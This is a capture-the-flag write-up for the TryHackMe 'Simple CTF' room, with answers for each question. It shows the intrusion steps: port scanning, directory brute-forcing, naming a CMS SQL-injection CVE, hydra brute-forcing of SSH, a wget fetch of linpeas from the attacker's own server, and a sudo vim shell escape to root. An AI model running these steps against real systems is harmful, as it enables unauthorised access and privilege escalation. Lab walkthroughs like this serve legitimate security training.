![Simple CTF Banner](https://tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Cover.png" alt="Simple CTF Cover">
</p>

# [Simple CTF](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/easyctf)

This guide contains the answer and steps necessary to get to them for the [Simple CTF](https://tryhackme.com/room/easyctf) room.

## Simple CTF 

In this room we

1. How many services are running under port 1000?

   To find these running services we use nmap.

   ```cmd
   sudo nmap 10.10.163.70 -sV -p-1000 -sC
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Nmap_Scan.png)

   ><details><summary>Click for answer</summary>2</details>

2. What is running on the higher port?

   I got trown of a little by the wording of the questions as the answer wasn't in the previous answer. For this answer I had to perform another scan where it scanned more ports.
   
   ```cmd
   sudo nmap 10.10.163.70 -sV -sC 
   ```
   
   ![Nmap Scan Extra](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Nmap_Scan_Extra.png)

   ><details><summary>Click for answer</summary>ssh</details>

3. What's the CVE you're using against the application?

   This took me a while to find, as I ended up at dead ends when looking for CVE's for the various services that were running on the machine. None of these yielded any results:
   
   - Openssh
   - Apache2
   - Looking through `searchsploit` for any exploits

   ```cmd
   searchsploit openss
   ```

   ![Searchsploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Searchsploit.png)
   
   The webserver didn't display anything interesting in our browser.
   
   ![Web Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Web_Page.png)
   
   So lets try finding any hidden pages with `dirsearch`.
   
   ```cmd
   dirsearch -u 10.10.163.70 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
   ```
   
   ![Hidden Web Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Hidden_Web_Page.png)
   
   Looks like there is one! Navigating there, we see it is an installation of CMS.
   
   ![CMS Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_CMS_Page.png)
   
   We can find the version of the program at the bottom of the pages.
   
   ![CMS Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_CMS_Version.png)
   
   Now we can look for any [exploits](https://www.exploit-db.com/exploits/46635) related to this vesrion of CMS.
   
   ![CMS Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_CMS_Exploit.png)
   
   ><details><summary>Click for answer</summary>CVE-2019-9053</details>

4. To what kind of vulnerability is the application vulnerable?

   Looking up this exploit on CVE-details we can find more information about this exploit.
   
   ![CMS CVE](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_CMS_CVE.png)

   ><details><summary>Click for answer</summary>sqli</details>

5. What's the password?

   Again, this threw me off again, since I was now looking for credentials for the CMS service. But I didn't find anything. After that I started to look for credentials for the ssh service (since ftp had anonymous login enabled).
   
   I could use Hydra for this, but then I would want to have at least a username to work with. However, looking at one of the articles on the webpage, we see a name from the author. Could be wort it to try this name out.
   
   ![CMS Article](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_CMS_Article.png)
   
   Using the following command with `hydra` may give us the password of the account.
   
   ```cmd
   hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.70:2222 -t 4
   ```
   
   ![Hydra Password Crack](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Hydra_Password_SSH.png)

   ><details><summary>Click for answer</summary>secret</details>

6. Where can you login with the details obtained?

   As mentioned before, this can be used to log in to the ssh service.

   ><details><summary>Click for answer</summary>ssh</details>

7. What's the user flag?

   Logging into the machine with ssh:
   
   ```cmd
   ssh mitch@10.10.163.70 -p 2222
   ```
   
   we find the user flag.
   
   ![User Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_User_Flag.png)

   ><details><summary>Click for answer</summary>G00d j0b, keep up!</details>

8. Is there any other user in the home directory? What's its name?

   To find other users we can use various commands.
   
   ```cmd
   ls -lh /home
   ```
   
   This simply looks through the `home` folder for any directories.
   
   ![SSH Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_SSH_Users.png)

   ><details><summary>Click for answer</summary>sunbath</details>

9. What can you leverage to spawn a privileged shell?

   This step also took me a little while as I had to look through various methods of elevating our [priveleges](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
). The first thing I did was stabalize our shell with:
   
   ```cmd
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
   
   Using `find / -perm -4000 2>/dev/null` didn't result in any executables that we could exploit.
   
   Next I tried using LinPeas. Started a server on our machine and transferring the script over. But that didn't work either.
   
   ```cmd
   python3 -m http.server 8080
   wget http://10.18.78.136:8080/linpeas.sh
   
   chmod x linpeas.sh
   ./linpeas.sh
   ```
   
   I looked at the kernel version with `uname -a` to find if it was vulnerable. Didn't give anything either.
   
   Finally, I looked at the executables we would be able to run with sudo.
   
   ```cmd
   sudo -l
   ```
   
   ![Sudo Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Sudo_Permissions.png)
   
   Looks like there might be a program that we can exploit with this.

   ><details><summary>Click for answer</summary>vim</details>

10. What's the root flag?

   Lets take a look at [GTFObins](https://gtfobins.github.io/gtfobins/vim/) to find out what we can do with vim. We know our user can run `vim` as sudo, so that is where we should look.
   
   ![GTFO Vim](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_GTFO_VIM.png)
   
   Now we input the command into our shell to get an elevated shell.
   
   ```cmd
   sudo vim -c ':!/bin/sh'
   ```
   
   ![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Root_Shell.png)
   
   Looks like this worked. After stabalizing our shell again, we can navigate to the root folder and find our flag.
   
   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/easyctf/Simple_CTF_Root_Flag.png)

   ><details><summary>Click for answer</summary>W3ll d0n3. You made it!</details>
